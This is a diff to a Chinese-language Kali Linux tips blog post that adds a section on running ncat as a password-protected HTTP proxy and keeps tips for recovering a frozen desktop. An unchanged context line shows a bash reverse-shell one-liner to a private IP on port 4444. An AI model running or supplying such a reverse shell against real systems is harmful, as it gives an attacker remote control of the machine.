@@ -136,6 +136,12 @@
 <p>bash -i &gt;&amp; /dev/tcp/192.168.1.107/4444 0&gt;&amp;1</p>
 </blockquote>
 <p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303192839_XDBQbF_Screenshot.jpeg" alt=""></p>
+<h2 id="0x07-kali-使用ncat-作-http-代理"><a href="#0x07-kali-使用ncat-作-http-代理" class="headerlink" title="0x07. kali 使用ncat 作 http 代理"></a>0x07. kali 使用ncat 作 http 代理</h2><blockquote>
+<p>当需要代理服务器时，可以使用 ncat 来代替，当然这是需要密码验证的，也不是任何人都能通过我们的代理服务器上网</p>
+<p>ncat -l 8080 <strong>-</strong>-proxy-type http –proxy-auth admin:root</p>
+</blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303195304_KAYICq_Screenshot.jpeg" alt=""></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303195334_duCLPP_Screenshot.jpeg" alt=""></p>
 <h2 id="0xFF-关于kali的小技巧"><a href="#0xFF-关于kali的小技巧" class="headerlink" title="0xFF. 关于kali的小技巧"></a>0xFF. 关于kali的小技巧</h2><h4 id="emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"><a href="#emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。" class="headerlink" title="&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"></a>&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。</h4><h4 id="emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式"><a href="#emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式" class="headerlink" title="&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式"></a>&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式</h4><h4 id="emsp-emsp-2-top命令查看当前CPU占用率最大的任务"><a href="#emsp-emsp-2-top命令查看当前CPU占用率最大的任务" class="headerlink" title="&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务"></a>&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务</h4><h4 id="emsp-emsp-3-pkill或者kill-掉该任务"><a href="#emsp-emsp-3-pkill或者kill-掉该任务" class="headerlink" title="&emsp;&emsp;3. pkill或者kill 掉该任务"></a>&emsp;&emsp;3. pkill或者kill 掉该任务</h4><h4 id="emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题"><a href="#emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题" class="headerlink" title="&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题"></a>&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题</h4>]]></content>
       
         
